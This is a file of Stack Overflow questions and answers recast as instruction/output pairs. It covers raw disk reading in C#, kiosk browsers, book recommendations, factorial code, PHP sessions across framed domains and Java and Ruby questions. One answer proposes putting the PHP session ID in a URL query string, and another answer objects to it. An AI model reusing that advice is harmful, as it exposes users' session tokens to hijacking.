                 // handle to file\n            byte[] lpBuffer,                // data buffer\n            int nNumberOfBytesToRead,        // number of bytes to read\n            ref int lpNumberOfBytesRead,    // number of bytes read\n            IntPtr lpOverlapped\n            //\n            // ref OVERLAPPED lpOverlapped        // overlapped buffer\n            );\n\n        private SafeFileHandle handleValue = null;\n        private FileStream _fs = null;\n\n        public DeviceStream(string device)\n        {\n            Load(device);\n        }\n\n        private void Load(string Path)\n        {\n            if (string.IsNullOrEmpty(Path))\n            {\n                throw new ArgumentNullException(\"Path\");\n            }\n\n            // Try to open the file.\n            IntPtr ptr = CreateFile(Path, GENERIC_READ, 0, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);\n\n            handleValue = new SafeFileHandle(ptr, true);\n            _fs = new FileStream(handleValue, FileAccess.Read);\n\n            // If the handle is invalid,\n            // get the last Win32 error \n            // and throw a Win32Exception.\n            if (handleValue.IsInvalid)\n            {\n                Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());\n            }\n        }\n\n        public override bool CanRead\n        {\n            get { return true; }\n        }\n\n        public override bool CanSeek\n        {\n            get { return false; }\n        }\n\n        public override bool CanWrite\n        {\n            get { return false; }\n        }\n\n        public override void Flush()\n        {\n            return;\n        }\n\n        public override long Length\n        {\n            get { return -1; }\n        }\n\n        public override long Position\n        {\n            get\n            {\n                throw new NotImplementedException();\n            }\n            set\n            {\n                throw new NotImplementedException();\n            }\n        }\n        /// <summary>\n        /// </summary>\n        /// <param name=\"buffer\">An array of bytes. When this method returns, the buffer contains the specified byte array with the values between offset and \n        /// (offset + count - 1) replaced by the bytes read from the current source. </param>\n        /// <param name=\"offset\">The zero-based byte offset in buffer at which to begin storing the data read from the current stream. </param>\n        /// <param name=\"count\">The maximum number of bytes to be read from the current stream.</param>\n        /// <returns></returns>\n        public override int Read(byte[] buffer, int offset, int count)\n        {\n            int BytesRead =0;\n            var BufBytes = new byte[count];\n            if (!ReadFile(handleValue.DangerousGetHandle(), BufBytes, count, ref BytesRead, IntPtr.Zero))\n            {\n                Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error());\n            }\n            for (int i = 0; i < BytesRead; i++)\n            {\n                buffer[offset + i] = BufBytes[i];\n            }\n            return BytesRead;\n        }\n        public override int ReadByte()\n        {\n            int BytesRead = 0;\n            var lpBuffer = new byte[1];\n            if (!ReadFile(\n            handleValue.DangerousGetHandle(),                        // handle to file\n            lpBuffer,                // data buffer\n            1,        // number of bytes to read\n            ref BytesRead,    // number of bytes read\n            IntPtr.Zero\n            ))\n            { Marshal.ThrowExceptionForHR(Marshal.GetHRForLastWin32Error()); ;}\n            return lpBuffer[0];\n        }\n\n        public override long Seek(long offset, SeekOrigin origin)\n        {\n            throw new NotImplementedException();\n        }\n\n        public override void SetLength(long value)\n        {\n            throw new NotImplementedException();\n        }\n\n        public override void Write(byte[] buffer, int offset, int count)\n        {\n            throw new NotImplementedException();\n        }\n\n        public override void Close()\n        {\n            handleValue.Close();\n            handleValue.Dispose();\n            handleValue = null;\n            base.Close();\n        }\n        private bool disposed = false;\n\n        new void Dispose()\n        {\n            Dispose(true);\n            base.Dispose();\n            GC.SuppressFinalize(this);\n        }\n\n        private new void Dispose(bool disposing)\n        {\n            // Check to see if Dispose has already been called.\n            if (!this.disposed)\n            {\n                if (disposing)\n                {\n                    if (handleValue != null)\n                    {\n                        _fs.Dispose();\n                        handleValue.Close();\n                        handleValue.Dispose();\n                        handleValue = null;\n                    }\n                }\n                // Note disposing has been done.\n                disposed = true;\n\n            }\n        }\n\n    }\n}\n\nAnd an example of using the class\nstatic void Main(string[] args)\n        {\n            var reader = new BinaryReader(new DeviceStream(@\"\\\\.\\PhysicalDrive3\"));\n            var writer = new BinaryWriter(new FileStream(@\"g:\\test.dat\", FileMode.Create));\n            var buffer = new byte[MB];\n            int count;\n            int loopcount=0;\n            try{\n                while((count=reader.Read(buffer,0,MB))>0)\n                {\n                    writer.Write(buffer,0,count);\n                    System.Console.Write('.');\n                    if(loopcount%100==0)\n                    {\n                        System.Console.WriteLine();\n                        System.Console.WriteLine(\"100MB written\");\n                        writer.Flush();\n                    }\n                    loopcount++;\n                }\n            }\n            catch(Exception e)\n            {\n                Console.WriteLine(e.Message);\n            }\n            reader.Close();\n            writer.Flush();\n            writer.Close();\n        }\n\nStandard disclaimers apply, this code may be hazardous to your health."}
{"instruction": "I am in a position where I can choose the client browser for my web app. The app is being used internally, and we are installing each client \"manually\".I would like to find a better solution for the browser,so :\nWhat is a good browser that I can use as a client to a web application?\nGeneral functionalities I would like to have:\n\nopening the browser from a\nshortcut, directly to the application's URL \nability to restrict navigation to a set of allowed URLs \nfullscreen mode, no menu, no address bar\njavascript \ngood CSS support\nability to cancel Back button (or at least solve the \"Webpage has expired\" IE problem)\n\nIE7 and FireFox are good candidates, but each seem to have it's own problems and issues.", "output": "Your last point, solving the \"webpage has expired\" problem, can be solved entirely on the server side by judicious use of the \"303 see other\" HTTP status code. Instead of returning a new page immediately as the result of an HTTP POST, return a 303 result code that redirects to another page that is a GET, that gets the contents you would like to show. This allows the user to use the back button without getting that expired message."}
{"instruction": "I am in a position where I can choose the client browser for my web app. The app is being used internally, and we are installing each client \"manually\".I would like to find a better solution for the browser,so :\nWhat is a good browser that I can use as a client to a web application?\nGeneral functionalities I would like to have:\n\nopening the browser from a\nshortcut, directly to the application's URL \nability to restrict navigation to a set of allowed URLs \nfullscreen mode, no menu, no address bar\njavascript \ngood CSS support\nability to cancel Back button (or at least solve the \"Webpage has expired\" IE problem)\n\nIE7 and FireFox are good candidates, but each seem to have it's own problems and issues.", "output": "When you run into serious issues, with Firefox you can trace it down to the code and maybe get someone to fix it. With IE, you can't."}
{"instruction": "I am in a position where I can choose the client browser for my web app. The app is being used internally, and we are installing each client \"manually\".I would like to find a better solution for the browser,so :\nWhat is a good browser that I can use as a client to a web application?\nGeneral functionalities I would like to have:\n\nopening the browser from a\nshortcut, directly to the application's URL \nability to restrict navigation to a set of allowed URLs \nfullscreen mode, no menu, no address bar\njavascript \ngood CSS support\nability to cancel Back button (or at least solve the \"Webpage has expired\" IE problem)\n\nIE7 and FireFox are good candidates, but each seem to have it's own problems and issues.", "output": "Because of your specific requirements you might want to consider embedding the IE ActiveX into a desktop application. That way you get full control of the client."}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "Who Moved My Cheese?\nby Spencer Johnson\n\nAll about accepting change will happen. Can easily be read in an hour on a plane."}
{"instruction": "I am in a position where I can choose the client browser for my web app. The app is being used internally, and we are installing each client \"manually\".I would like to find a better solution for the browser,so :\nWhat is a good browser that I can use as a client to a web application?\nGeneral functionalities I would like to have:\n\nopening the browser from a\nshortcut, directly to the application's URL \nability to restrict navigation to a set of allowed URLs \nfullscreen mode, no menu, no address bar\njavascript \ngood CSS support\nability to cancel Back button (or at least solve the \"Webpage has expired\" IE problem)\n\nIE7 and FireFox are good candidates, but each seem to have it's own problems and issues.", "output": "Mozilla Prism seems ideal for your purposes.\nIt shares code with Firefox but is designed to run web applications without the usual Browser interface to make them appear more like desktop applications.  So no back button or address bar to worry about.\nEdit: Google Chrome has Application Shortcuts so that may now be a better option."}
{"instruction": "I am in a position where I can choose the client browser for my web app. The app is being used internally, and we are installing each client \"manually\".I would like to find a better solution for the browser,so :\nWhat is a good browser that I can use as a client to a web application?\nGeneral functionalities I would like to have:\n\nopening the browser from a\nshortcut, directly to the application's URL \nability to restrict navigation to a set of allowed URLs \nfullscreen mode, no menu, no address bar\njavascript \ngood CSS support\nability to cancel Back button (or at least solve the \"Webpage has expired\" IE problem)\n\nIE7 and FireFox are good candidates, but each seem to have it's own problems and issues.", "output": "Firefox:\n\nmulti-platform\nkiosk add-on\npatch the chrome logic with zip and javascript\nsee the FF 3.1 javascript speed improvements\neasily deploy standard bookmarks"}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "The Visual Display of Quantitative Information\nby Edward Tufte\n\nDiscusses how to graphically represent different types of complex data"}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "Musashi by Eiji Yoshikawa gives some pretty good life lessons. The story is about a young Samurai in the 1600 that is at principle very angry and stubborn, but after commiting many crimes he gets imprisioned for 3 years, while locked away he regret his past and decide to go on a self improving journey to learn the way of the sword in order improve as a person. You can apply it to become a better professional yourself, through his journeys Musashi learned many thing, specially how people behave and how to lead by example."}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "Here's a strange one for you all to think about.\nOn The Road by Jack Kerouac.\nIt's a modern classic that everybody should read, and I'd be very surprised if English or Media Studies students weren't recommended to read it at some time. Reading should not only be informative and educational, but enjoyable as well. If you're not going to read a book for pure fun now and again then you'll only end up frustrated with the books you need to read as a programmer/developer.\nThis book is a real eye-opener; a book that'll really make you think about your own life, and for a programmer whom spends their day dealing with pure thought-stuff it's a great way to get you thinking on a different track."}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "Orbiting the Giant Hairball\nOrbiting the Giant Hairball: A Corporate Fool's Guide to Surviving with Grace\nby Gordon Mackenzie\nA short well written book with some great illustrations - explains how most large organisations don't really understand how to deal with creative people, and how such places are usually run so that the creatives/engineers are powerless. Mackenzie recounts his (mostly positive) experiences at Hallmark."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Oddball examples? What about using the gamma function! Since, Gamma n = (n-1)!.\nOCaml: Using Gamma\nlet rec gamma z =\n    let pi = 4.0 *. atan 1.0 in\n    if z < 0.5 then\n        pi /. ((sin (pi*.z)) *. (gamma (1.0 -. z)))\n    else\n        let consts = [| 0.99999999999980993; 676.5203681218851; -1259.1392167224028;\n                        771.32342877765313; -176.61502916214059; 12.507343278686905;\n                 -0.13857109526572012; 9.9843695780195716e-6; 1.5056327351493116e-7;\n                     |] \n        in\n        let z = z -. 1.0 in\n        let results = Array.fold_right \n                          (fun x y -> x +. y)\n                          (Array.mapi \n                              (fun i x -> if i = 0 then x else x /. (z+.(float i)))\n                              consts\n                          )\n                          0.0\n        in\n        let x = z +. (float (Array.length consts)) -. 1.5 in\n        let final = (sqrt (2.0*.pi)) *. \n                    (x ** (z+.0.5)) *.\n                    (exp (-.x)) *. result\n        in\n        final\n\nlet factorial_gamma n = int_of_float (gamma (float (n+1)))"}
{"instruction": "When opening a file from your hard drive into your browser, where is the document root?  To illustrate, given the following HTML code, if the page is opened from the local machine(file:///) then where should the css file be for the browser to find it?\n<link href=\"/temp/test.css\" rel=\"stylesheet\" type=\"text/css\" />", "output": "You can, but probably don't want to, set the document root on a per-file basis in the  head of your file:\n\n<base href=\"my-root\">"}
{"instruction": "I've to admin a small website for my alumni group which is hosted by my ISV. The url is something like www.myIsv.com/myWebSite/ which is quite ugly and very forgetable. The main admin of the webserver has registered a domain name www.mysmallwebsite.com and put a index.html with this content:\n<html>\n<head>\n<title>www.mysmallwebsite.com</title>\n</head>\n\n<frameset>\n   <frame src=\"http://www.myIsv.com/myWebSite/\" name=\"redir\">\n      <noframes>\n        <p>Original location:\n          <a href=\"www.myIsv.com/myWebSite/\">http://www.myIsv.com/myWebSite/</a>\n        </p>\n      </noframes>\n </frameset>  \n</html>\n\nIt works fine, but some features like PHP Session variables doesn't work anymore! Anyone has a suggestion for correcting that?\nEdit:\nThis doesn't work both on IE and on Firefox (no plugins)\nThanks", "output": "What do you mean?\nAre you saying that when you go from www.mysmallwebsite.com to www.myIsv.com/myWebSite/ then the PHP session is lost?\nPHP recognizes the session with an ID (alpha-numeric hash generated on the server). The ID is passed from request to request using a cookie called PHPSESSID or something like that (you can view the cookies a websites sets with the help of your browser ... on Firefox you have Firebug + FireCookie and the wonderful Web Developer Toolbar ... with which you can view the list of cookies without a sweat).\nSo ... PHP is passing the session ID through the PHPSESSID cookie. But you can pass the session ID as a plain GET request parameters.\nSo when you place the html link to the ugly domain name, assuming that it is the same PHP server (with the same sessions initialized), you can put it like this ...\nwww.myIsv.com/myWebSite/?PHPSESSID=<?=session_id()?>\n\nI haven't worked with PHP for a while, but I think this will work."}
{"instruction": "I've to admin a small website for my alumni group which is hosted by my ISV. The url is something like www.myIsv.com/myWebSite/ which is quite ugly and very forgetable. The main admin of the webserver has registered a domain name www.mysmallwebsite.com and put a index.html with this content:\n<html>\n<head>\n<title>www.mysmallwebsite.com</title>\n</head>\n\n<frameset>\n   <frame src=\"http://www.myIsv.com/myWebSite/\" name=\"redir\">\n      <noframes>\n        <p>Original location:\n          <a href=\"www.myIsv.com/myWebSite/\">http://www.myIsv.com/myWebSite/</a>\n        </p>\n      </noframes>\n </frameset>  \n</html>\n\nIt works fine, but some features like PHP Session variables doesn't work anymore! Anyone has a suggestion for correcting that?\nEdit:\nThis doesn't work both on IE and on Firefox (no plugins)\nThanks", "output": "Do session variables work if you hit http://www.myIsv.com/myWebSite/ directly?  It would seem to me that the server config would dictate whether or not sessions will work.  However, if you're starting a session on www.mysmallwebsite.com somehow (doesn't look like you're using PHP, but maybe you are), you're not going to be able to transfer session data without writing some backend logic that moves the session from server to server."}
{"instruction": "I've to admin a small website for my alumni group which is hosted by my ISV. The url is something like www.myIsv.com/myWebSite/ which is quite ugly and very forgetable. The main admin of the webserver has registered a domain name www.mysmallwebsite.com and put a index.html with this content:\n<html>\n<head>\n<title>www.mysmallwebsite.com</title>\n</head>\n\n<frameset>\n   <frame src=\"http://www.myIsv.com/myWebSite/\" name=\"redir\">\n      <noframes>\n        <p>Original location:\n          <a href=\"www.myIsv.com/myWebSite/\">http://www.myIsv.com/myWebSite/</a>\n        </p>\n      </noframes>\n </frameset>  \n</html>\n\nIt works fine, but some features like PHP Session variables doesn't work anymore! Anyone has a suggestion for correcting that?\nEdit:\nThis doesn't work both on IE and on Firefox (no plugins)\nThanks", "output": "Stick a session_start() at the beginning of your script and see if you can access the variables again."}
{"instruction": "I've to admin a small website for my alumni group which is hosted by my ISV. The url is something like www.myIsv.com/myWebSite/ which is quite ugly and very forgetable. The main admin of the webserver has registered a domain name www.mysmallwebsite.com and put a index.html with this content:\n<html>\n<head>\n<title>www.mysmallwebsite.com</title>\n</head>\n\n<frameset>\n   <frame src=\"http://www.myIsv.com/myWebSite/\" name=\"redir\">\n      <noframes>\n        <p>Original location:\n          <a href=\"www.myIsv.com/myWebSite/\">http://www.myIsv.com/myWebSite/</a>\n        </p>\n      </noframes>\n </frameset>  \n</html>\n\nIt works fine, but some features like PHP Session variables doesn't work anymore! Anyone has a suggestion for correcting that?\nEdit:\nThis doesn't work both on IE and on Firefox (no plugins)\nThanks", "output": "It's not working because on the client sessions are per-domain. All the cookies are being saved for mysmallwebsite.com, so myIsv.com cannot access them."}
{"instruction": "I've to admin a small website for my alumni group which is hosted by my ISV. The url is something like www.myIsv.com/myWebSite/ which is quite ugly and very forgetable. The main admin of the webserver has registered a domain name www.mysmallwebsite.com and put a index.html with this content:\n<html>\n<head>\n<title>www.mysmallwebsite.com</title>\n</head>\n\n<frameset>\n   <frame src=\"http://www.myIsv.com/myWebSite/\" name=\"redir\">\n      <noframes>\n        <p>Original location:\n          <a href=\"www.myIsv.com/myWebSite/\">http://www.myIsv.com/myWebSite/</a>\n        </p>\n      </noframes>\n </frameset>  \n</html>\n\nIt works fine, but some features like PHP Session variables doesn't work anymore! Anyone has a suggestion for correcting that?\nEdit:\nThis doesn't work both on IE and on Firefox (no plugins)\nThanks", "output": "@pix0r\nwww.myIsv.com/myWebSite/ -> session variable work\nwww.mysmallwebsite.com   -> session variable doesn't work\n@Alexandru\nUnfortunately this is not on the same webserver"}
{"instruction": "I've to admin a small website for my alumni group which is hosted by my ISV. The url is something like www.myIsv.com/myWebSite/ which is quite ugly and very forgetable. The main admin of the webserver has registered a domain name www.mysmallwebsite.com and put a index.html with this content:\n<html>\n<head>\n<title>www.mysmallwebsite.com</title>\n</head>\n\n<frameset>\n   <frame src=\"http://www.myIsv.com/myWebSite/\" name=\"redir\">\n      <noframes>\n        <p>Original location:\n          <a href=\"www.myIsv.com/myWebSite/\">http://www.myIsv.com/myWebSite/</a>\n        </p>\n      </noframes>\n </frameset>  \n</html>\n\nIt works fine, but some features like PHP Session variables doesn't work anymore! Anyone has a suggestion for correcting that?\nEdit:\nThis doesn't work both on IE and on Firefox (no plugins)\nThanks", "output": "What browser/ ad-on do you have? it may be your browser or some other software (may be even the web server) is blocking the sessions from http://www.myIsv.com/myWebSite/ working from with-in the frame, as its located on a different site, thinking its an XSS attack.\nIf the session works at http://www.myIsv.com/myWebSite/ with out the frame you could always us a redirect from http://www.mysmallwebsite.com to the ugly url, instead of using the frame.\nEDIT:\nI have just tried your frame code on a site of mine that uses sessions, firefox worked fine, with me logging in and staying loged in, but IE7 logged me straight out again."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "C: One liner, procedural\nint f(int n) { for (int i = n - 1; i > 0; n *= i, i--); return n ? n : 1; }\n\nI used int's for brevity; use other types to support larger numbers."}
{"instruction": "I've to admin a small website for my alumni group which is hosted by my ISV. The url is something like www.myIsv.com/myWebSite/ which is quite ugly and very forgetable. The main admin of the webserver has registered a domain name www.mysmallwebsite.com and put a index.html with this content:\n<html>\n<head>\n<title>www.mysmallwebsite.com</title>\n</head>\n\n<frameset>\n   <frame src=\"http://www.myIsv.com/myWebSite/\" name=\"redir\">\n      <noframes>\n        <p>Original location:\n          <a href=\"www.myIsv.com/myWebSite/\">http://www.myIsv.com/myWebSite/</a>\n        </p>\n      </noframes>\n </frameset>  \n</html>\n\nIt works fine, but some features like PHP Session variables doesn't work anymore! Anyone has a suggestion for correcting that?\nEdit:\nThis doesn't work both on IE and on Firefox (no plugins)\nThanks", "output": "So when you place the html link to the ugly domain name, assuming that it is the same PHP server (with the same sessions initialized), you can put it like this ...\nwww.myIsv.com/myWebSite/?PHPSESSID=<?=session_id()?>\n\nFrom a security point of view, I really really really hope that doesn't work"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "BASIC: old school\n10 HOME\n20 INPUT N\n30 LET ANS = 1\n40 FOR I = 1 TO N\n50   ANS = ANS * I\n60 NEXT I\n70 PRINT ANS"}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "Dreaming in Code\nby Scott Rosenberg (Amazon Wikipedia)\n\nA great book about the development process. It also highlights how developers are doomed to keep repeating the same mistakes over and over again"}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "Dealers of Lightning\nby Michael Hiltzik\nThe story of Xerox PARC."}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "The Art of Deception\nKevin Mitnick explains social engineering attacks"}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "The Explosive Child:\nIf you are a parent this is a must-read book. It will improve your life and how you relate to your family.\nIf you are not a parent, it will give you an insight into what we go through. Also, it gives great pointers of how to deal with chronically inflexible children or even adults."}
{"instruction": "This is a poll asking the Stackoverflow community what non-programming books they would recommend to fellow programmers.\nPlease read the following before posting:\n\nPlease post only ONE BOOK PER ANSWER.\nPlease search for your recommendation on this page before posting (there are over NINE PAGES so it is advisable to check them all). Many books have already been suggested and we want to avoid duplicates. If you find your recommendation is already present, vote it up or add some commentary.\nPlease elaborate on why you think a given book is worth reading from a programmer's perspective.\n\nNote: this article is similar and contains other useful suggestions.", "output": "The Hitchhiker's Guide to the Galaxy\nby Douglas Adams\n\nLife, the universe, and everything\n\"See first, think later, then test. But always see first. Otherwise you will only see what you were expecting. Most scientists forget that.\" -- Wonko the Sane"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Java 1.6: recursive, memoized (for subsequent calls)\nprivate static Map<BigInteger, BigInteger> _results = new HashMap()\n\npublic static BigInteger factorial(BigInteger n){\n    if (0 >= n.compareTo(BigInteger.ONE))\n       return BigInteger.ONE.max(n);\n    if (_results.containsKey(n))\n       return _results.get(n);\n    BigInteger result = factorial(n.subtract(BigInteger.ONE)).multiply(n);\n    _results.put(n, result);\n    return result;\n}"}
{"instruction": "In Java 5 and above you have the foreach loop, which works magically on anything that implements Iterable:\nfor (Object o : list) {\n  doStuff(o);\n}\n\nHowever, Enumerable still does not implement Iterable, meaning that to iterate over an Enumeration you must do the following:\nfor(; e.hasMoreElements() ;) {\n  doStuff(e.nextElement());\n}\n\nDoes anyone know if there is a reason why Enumeration still does not implement Iterable?\nEdit: As a clarification, I'm not talking about the language concept of an enum, I'm talking a Java-specific class in the Java API called 'Enumeration'.", "output": "It doesn't make sense for Enumeration to implement Iterable. Iterable is a factory method for Iterator. Enumeration is analogous to Iterator, and only maintains state for a single enumeration.\nSo, be careful trying to wrap an Enumeration as an Iterable. If someone passes me an Iterable, I will assume that I can call iterator() on it repeatedly, creating as many Iterator instances as I want, and iterating independently on each. A wrapped Enumeration will not fulfill this contract; don't let your wrapped Enumeration escape from your own code. (As an aside, I noticed that Java 7's DirectoryStream violates expectations in just this way, and shouldn't be allowed to \"escape\" either.)\nEnumeration is like an Iterator, not an Iterable. A Collection is Iterable. An Iterator is not.\nYou can't do this:\nVector<X> list = \u2026\nIterator<X> i = list.iterator();\nfor (X x : i) {\n    x.doStuff();\n}\n\nSo it wouldn't make sense to do this:\nVector<X> list = \u2026\nEnumeration<X> i = list.enumeration();\nfor (X x : i) {\n    x.doStuff();\n}\n\nThere is no Enumerable equivalent to Iterable. It could be added without breaking anything to work in for loops, but what would be the point? If you are able to implement this new Enumerable interface, why not just implement Iterable instead?"}
{"instruction": "I'm just getting dirty in WinForms, and I've discovered, through a lovely tutorial, the magic of dragging a database table onto the design view of my main form. So, all is lovely, I've got my DataGridView with all of the columns represented beautifully.\nBUT...\nWhen I run my application against this brand new, empty .sdf (empty save for the two tables I've created, which are themselves empty), I get a -1 in the column corresponding to my primary key/identity column whenever I try to create that first record.\nAny idea why this might be happening? If it helps, the column is an int.", "output": "Since it is an Identity column and you haven't saved it to the database yet it is -1.  I am assuming here that this is before you save the table back to the database, correct?  You need to perform the insert before that value will be set correctly."}
{"instruction": "Is is possible to read a disk directly with .Net?  By directly I mean via the device bypassing the file system.  I think I would go about this by opening the device some way \"\\Device\\Ide\\IdeDeviceP2T0L0-1\" for example. \nIf I can't open the device with a .NET api knowing which Win32 API to use would be helpful.", "output": "Man. With all that marshalling and stuff, why not just write a dll in C and forego .NET\nYou could then p/invoke your dll and have a much easier time of it all"}
{"instruction": "I'm just getting dirty in WinForms, and I've discovered, through a lovely tutorial, the magic of dragging a database table onto the design view of my main form. So, all is lovely, I've got my DataGridView with all of the columns represented beautifully.\nBUT...\nWhen I run my application against this brand new, empty .sdf (empty save for the two tables I've created, which are themselves empty), I get a -1 in the column corresponding to my primary key/identity column whenever I try to create that first record.\nAny idea why this might be happening? If it helps, the column is an int.", "output": "@Brian -1 is a good choice for the default value since no \"real\" rows are likely to have identities less than zero. If it defaulted to 0 or 1 then there'd be a chance that it'd clash with an existing row, causing a primary key violation.\nFor applications that stay offline and create multiple rows before saving, a common practice is to continue counting backwards (-2, -3, -4) for each new row's identity. Then when they're saved, the server can replace them with the true \"next\" value from the table."}
{"instruction": "Joe Van Dyk asked the Ruby mailing list:\n\nHi,\nIn Ruby, I guess you can't marshal a lambda/proc object, right?  Is\n  that possible in lisp or other languages?\nWhat I was trying to do:\n\nl = lamda { ... }\nBj.submit \"/path/to/ruby/program\", :stdin => Marshal.dump(l)\n\n\nSo, I'm sending BackgroundJob a lambda object, which contains the\n  context/code for what to do.  But, guess that wasn't possible.  I\n  ended up marshaling a normal ruby object that contained instructions\n  for what to do after the program ran.\nJoe", "output": "You cannot marshal a Lambda or Proc. This is because both of them are considered closures, which means they close around the memory on which they were defined and can reference it. (In order to marshal them you'd have to Marshal all of the memory they could access at the time they were created.)\nAs Gaius pointed out though, you can use ruby2ruby to get a hold of the string of the program. That is, you can marshal the string that represents the ruby code and then reevaluate it later."}
